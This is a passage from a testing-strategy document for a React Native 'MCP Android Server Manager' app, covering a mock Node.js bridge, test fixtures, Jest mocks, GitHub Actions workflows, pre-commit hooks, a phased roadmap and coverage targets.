  start(script: string) {
    this.started = true;
    console.log(`Mock NodeJS started with script: ${script}`);

    // Simulate ready signal after delay
    setTimeout(() => {
      this.sendMessage({ type: 'ready' });
    }, 100);
  }

  channel = {
    addListener: jest.fn((event: string, callback: (msg: string) => void) => {
      if (event === 'message') {
        this.messageListeners.push(callback);
      }
    }),

    send: jest.fn((message: string) => {
      const parsed = JSON.parse(message);

      // Simulate responses based on message type
      setTimeout(() => {
        switch (parsed.type) {
          case 'status':
            this.sendMessage({
              type: 'status',
              serverId: parsed.serverId,
              payload: 'stopped',
              requestId: parsed.requestId,
            });
            break;

          case 'clone':
            // Simulate clone progress
            this.sendMessage({
              type: 'log',
              serverId: parsed.serverId,
              payload: { level: 'info', message: 'Cloning repository...' },
            });

            setTimeout(() => {
              this.sendMessage({
                type: 'status',
                serverId: parsed.serverId,
                payload: 'ready',
                requestId: parsed.requestId,
              });
            }, 200);
            break;

          case 'start':
            this.sendMessage({
              type: 'status',
              serverId: parsed.serverId,
              payload: 'running',
              requestId: parsed.requestId,
            });
            break;

          case 'stop':
            this.sendMessage({
              type: 'status',
              serverId: parsed.serverId,
              payload: 'stopped',
              requestId: parsed.requestId,
            });
            break;

          case 'logs':
            this.sendMessage({
              type: 'logs',
              serverId: parsed.serverId,
              payload: [
                { timestamp: new Date(), level: 'info', message: 'Server started' },
              ],
              requestId: parsed.requestId,
            });
            break;
        }
      }, 50);
    }),
  };

  sendMessage(message: any) {
    const stringified = JSON.stringify(message);
    this.messageListeners.forEach((listener) => listener(stringified));
  }

  isStarted() {
    return this.started;
  }

  reset() {
    this.messageListeners = [];
    this.started = false;
  }
}

export const mockNodeJS = new MockNodeJS();
```

### 5.2 Test Fixtures

**File**: `src/__tests__/mocks/fixtures.ts`

```typescript
import { MCPServer, GitHubRepo } from '../../types';

export const mockGitHubRepo: GitHubRepo = {
  name: 'test-mcp-server',
  fullName: 'testuser/test-mcp-server',
  description: 'A test MCP server for unit testing',
  url: 'https://github.com/testuser/test-mcp-server',
  defaultBranch: 'main',
  stars: 42,
  language: 'TypeScript',
};

export const mockServer: MCPServer = {
  id: 'test-server-123',
  name: 'test-mcp-server',
  description: 'A test MCP server',
  repoUrl: 'https://github.com/testuser/test-mcp-server.git',
  branch: 'main',
  status: 'stopped',
  port: 3000,
  createdAt: new Date('2024-01-01T00:00:00Z'),
  config: {
    autoStart: false,
    restartOnCrash: true,
    maxRestarts: 3,
  },
};

export const mockRunningServer: MCPServer = {
  ...mockServer,
  status: 'running',
  lastStarted: new Date('2024-01-01T12:00:00Z'),
};

export const mockServerWithError: MCPServer = {
  ...mockServer,
  status: 'error',
  errorMessage: 'Port 3000 already in use',
};

export const mockNetworkState = {
  connected: {
    type: 'WIFI',
    isConnected: true,
    isInternetReachable: true,
  },
  disconnected: {
    type: 'NONE',
    isConnected: false,
    isInternetReachable: false,
  },
  vpn: {
    type: 'VPN',
    isConnected: true,
    isInternetReachable: true,
  },
};

export const mockTailscaleStatus = {
  installed: {
    installed: true,
    connected: true,
    ipAddress: '100.64.1.100',
  },
  notInstalled: {
    installed: false,
    connected: false,
    ipAddress: null,
  },
  installedNotConnected: {
    installed: true,
    connected: false,
    ipAddress: null,
  },
};

export const mockGitHubAPIResponse = {
  success: {
    name: 'test-mcp-server',
    full_name: 'testuser/test-mcp-server',
    description: 'A test server',
    clone_url: 'https://github.com/testuser/test-mcp-server.git',
    default_branch: 'main',
    stargazers_count: 42,
    language: 'TypeScript',
    private: false,
    archived: false,
    disabled: false,
  },
  privateRepo: {
    name: 'private-server',
    full_name: 'testuser/private-server',
    description: 'Private repo',
    clone_url: 'https://github.com/testuser/private-server.git',
    default_branch: 'main',
    stargazers_count: 0,
    language: 'JavaScript',
    private: true,
    archived: false,
    disabled: false,
  },
  archivedRepo: {
    name: 'old-server',
    full_name: 'testuser/old-server',
    description: 'Archived repo',
    clone_url: 'https://github.com/testuser/old-server.git',
    default_branch: 'master',
    stargazers_count: 100,
    language: 'Python',
    private: false,
    archived: true,
    disabled: false,
  },
};
```

---

## 6. Testing Challenges and Solutions

### Challenge 1: Mocking nodejs-mobile-react-native

**Problem**: Third-party native module with complex IPC communication

**Solution**:
```typescript
// Create comprehensive mock with event simulation
jest.mock('nodejs-mobile-react-native', () => ({
  start: jest.fn(),
  channel: {
    addListener: jest.fn((event, callback) => {
      if (event === 'message') {
        // Store callback for later invocation in tests
        global.__nodejsMessageCallback = callback;
      }
    }),
    send: jest.fn((msg) => {
      // Parse and auto-respond in tests
      const parsed = JSON.parse(msg);
      if (global.__nodejsAutoRespond) {
        global.__nodejsAutoRespond(parsed);
      }
    }),
  },
}));
```

### Challenge 2: Testing AsyncStorage Persistence

**Problem**: Async persistence with Zustand middleware

**Solution**:
```typescript
import { act, waitFor } from '@testing-library/react-native';

// Wait for persistence to complete
await waitFor(() => {
  expect(AsyncStorage.setItem).toHaveBeenCalledWith(
    'mcp-server-storage',
    expect.any(String)
  );
});

// Verify persisted data structure
const savedData = JSON.parse(
  (AsyncStorage.setItem as jest.Mock).mock.calls[0][1]
);
expect(savedData.state.servers).toHaveLength(1);
```

### Challenge 3: Testing Long-Running Operations

**Problem**: Git clone and npm install can take minutes

**Solution**:
```typescript
// Use shorter timeouts in tests
jest.setTimeout(10000);

// Mock long operations
(serverManager.cloneRepo as jest.Mock).mockImplementation(() => {
  return new Promise((resolve) => {
    // Simulate progress events
    setTimeout(() => resolve(), 100);
  });
});

// Test timeout handling separately
it('should timeout long operations', async () => {
  (serverManager.cloneRepo as jest.Mock).mockImplementation(
    () => new Promise(() => {}) // Never resolves
  );

  await expect(
    nodeBridge.sendMessage({ type: 'clone' }, 1000)
  ).rejects.toThrow('timeout');
}, 5000);
```

### Challenge 4: Testing Android-Specific APIs

**Problem**: expo-network, expo-clipboard are platform-specific

**Solution**:
```typescript
// Create platform-agnostic mocks
jest.mock('expo-network', () => ({
  getNetworkStateAsync: jest.fn(),
  getIpAddressAsync: jest.fn(),
  NetworkStateType: {
    WIFI: 'WIFI',
    VPN: 'VPN',
    CELLULAR: 'CELLULAR',
  },
}));

// Test different platform scenarios
describe('platform-specific behavior', () => {
  it('should detect VPN on Android', async () => {
    Platform.OS = 'android';
    // Test implementation
  });

  it('should handle iOS limitations', async () => {
    Platform.OS = 'ios';
    // Test fallback behavior
  });
});
```

### Challenge 5: Testing File System Operations

**Problem**: expo-file-system operations need mocking

**Solution**:
```typescript
jest.mock('expo-file-system', () => ({
  documentDirectory: 'file:///mock/documents/',
  getInfoAsync: jest.fn((path) =>
    Promise.resolve({ exists: true, isDirectory: true })
  ),
  makeDirectoryAsync: jest.fn(() => Promise.resolve()),
  deleteAsync: jest.fn(() => Promise.resolve()),
  readDirectoryAsync: jest.fn(() => Promise.resolve([])),
}));

// Simulate file system states
(FileSystem.getInfoAsync as jest.Mock).mockResolvedValueOnce({
  exists: false,
});
```

---

## 7. CI/CD Integration

### 7.1 GitHub Actions Workflow

**File**: `.github/workflows/test.yml`

```yaml
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [18.x, 20.x]

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

      - name: Run type check
        run: npm run type-check

      - name: Run unit tests
        run: npm run test:unit -- --coverage

      - name: Run integration tests
        run: npm run test:integration -- --coverage

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/lcov.info
          flags: unittests
          name: codecov-umbrella

      - name: Comment coverage on PR
        uses: romeovs/lcov-reporter-action@v0.3.1
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          lcov-file: ./coverage/lcov.info

      - name: Archive test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: test-results
          path: |
            coverage/
            test-results/

  test-node:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18.x

      - name: Test Node.js runtime
        run: |
          cd nodejs-assets/nodejs-project
          npm install
          npm test
```

### 7.2 Pre-commit Hooks (Husky)

**Installation**:
```bash
npm install --save-dev husky lint-staged
npx husky install
```

**File**: `.husky/pre-commit`

```bash
#!/bin/sh
. "$(dirname "$0")/_/husky.sh"

npm run lint-staged
```

**File**: `package.json` (add)

```json
{
  "lint-staged": {
    "*.{ts,tsx}": [
      "eslint --fix",
      "jest --bail --findRelatedTests --passWithNoTests"
    ],
    "*.{json,md}": [
      "prettier --write"
    ]
  }
}
```

### 7.3 Coverage Reporting

**File**: `.github/workflows/coverage.yml`

```yaml
name: Coverage

on:
  push:
    branches: [main]

jobs:
  coverage:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18.x
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Generate coverage
        run: npm run test:coverage

      - name: Upload to Codecov
        uses: codecov/codecov-action@v3
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          files: ./coverage/lcov.info
          fail_ci_if_error: true

      - name: Generate coverage badge
        uses: cicirello/jacoco-badge-generator@v2
        with:
          badges-directory: badges
          generate-coverage-badge: true

      - name: Commit badge
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "GitHub Action"
          git add badges/coverage.svg
          git commit -m "Update coverage badge" || echo "No changes"
          git push
```

---

## 8. Implementation Roadmap

### Phase 1: Foundation (Week 1)
- [ ] Install Jest and React Native Testing Library
- [ ] Configure jest.config.js and jest.setup.js
- [ ] Create mock files for external dependencies
- [ ] Set up test directory structure
- [ ] Add test scripts to package.json

### Phase 2: Unit Tests (Week 2)
- [ ] Write tests for security.ts (100% coverage goal)
- [ ] Write tests for schemas.ts
- [ ] Write tests for network.ts
- [ ] Write tests for tailscaleService.ts
- [ ] Achieve 80%+ coverage on utilities

### Phase 3: Integration Tests (Week 3)
- [ ] Write tests for nodeBridge.ts
- [ ] Write tests for serverManager.ts
- [ ] Write tests for serverStore.ts
- [ ] Test IPC communication flows
- [ ] Achieve 70%+ coverage on services

### Phase 4: Component Tests (Week 4)
- [ ] Write tests for ServerCard component
- [ ] Write tests for TailscaleCard component
- [ ] Write tests for screen components
- [ ] Test user interactions
- [ ] Achieve 60%+ coverage on UI

### Phase 5: E2E Tests (Week 5)
- [ ] Set up Detox or Appium
- [ ] Write server lifecycle E2E tests
- [ ] Write user flow E2E tests
- [ ] Test critical user journeys
- [ ] Document E2E test procedures

### Phase 6: CI/CD Integration (Week 6)
- [ ] Set up GitHub Actions workflows
- [ ] Configure code coverage reporting
- [ ] Set up pre-commit hooks
- [ ] Integrate with Codecov or Coveralls
- [ ] Add coverage badges to README

### Phase 7: Node.js Runtime Tests (Week 7)
- [ ] Write tests for main.js
- [ ] Test git clone operations
- [ ] Test npm install operations
- [ ] Test server spawning
- [ ] Achieve 70%+ coverage on Node.js code

### Phase 8: Continuous Improvement (Ongoing)
- [ ] Monitor test performance
- [ ] Refactor slow tests
- [ ] Add tests for new features
- [ ] Maintain >80% overall coverage
- [ ] Regular test suite maintenance

---

## 9. Success Metrics

### Coverage Targets
- **Overall**: 80% statements, 75% branches, 80% functions
- **Critical Utilities (security, validation)**: 95%+
- **Services (bridge, manager, store)**: 85%+
- **Components**: 70%+
- **Node.js Runtime**: 75%+

### Quality Metrics
- All tests pass in CI/CD
- Test execution time < 2 minutes
- Zero flaky tests
- No skipped tests in main branch
- Coverage increases over time

### Performance Benchmarks
- Unit tests: < 10 seconds
- Integration tests: < 30 seconds
- E2E tests: < 5 minutes
- Total suite: < 6 minutes

---

## 10. Resources and Documentation

### Testing Libraries
- [Jest Documentation](https://jestjs.io/)
- [React Native Testing Library](https://callstack.github.io/react-native-testing-library/)
- [Testing Library Best Practices](https://kentcdodds.com/blog/common-mistakes-with-react-testing-library)

### Expo Testing
- [Expo Testing Guide](https://docs.expo.dev/develop/unit-testing/)
- [jest-expo Preset](https://docs.expo.dev/guides/testing-with-jest/)

### React Native Testing
- [Testing React Native Apps](https://reactnative.dev/docs/testing-overview)
- [E2E Testing with Detox](https://wix.github.io/Detox/)

### Zustand Testing
- [Testing Zustand Stores](https://docs.pmnd.rs/zustand/guides/testing)

---

## 11. Conclusion

The MCP Android Server Manager currently has **zero test coverage**, representing a **critical risk** for production deployment. This document provides a comprehensive testing strategy to address this gap, including:

1. **Immediate Actions**: Set up Jest and React Native Testing Library
2. **Priority Testing**: Focus on critical security and validation utilities first
3. **Comprehensive Coverage**: Achieve 80%+ coverage across all code layers
4. **CI/CD Integration**: Automate testing in development workflow
5. **Continuous Improvement**: Maintain and enhance test suite over time

**Estimated Effort**: 7-8 weeks for full implementation
**Expected Outcome**: Production-ready test suite with >80% coverage and automated CI/CD

---

## Appendix A: Quick Start Commands

```bash
# Install dependencies
npm install --save-dev @testing-library/react-native @testing-library/jest-native jest jest-expo ts-jest

# Run all tests
npm test

# Run with coverage
npm run test:coverage

# Watch mode for development
npm run test:watch

# Run specific test suite
npm run test:unit
npm run test:integration

# Run tests for single file
npm test -- security.test.ts

# Update snapshots
npm test -- -u
```

---

**Document Version**: 1.0
**Last Updated**: January 28, 2026
**Author**: Test Automation Engineer
**Status**: Ready for Implementation
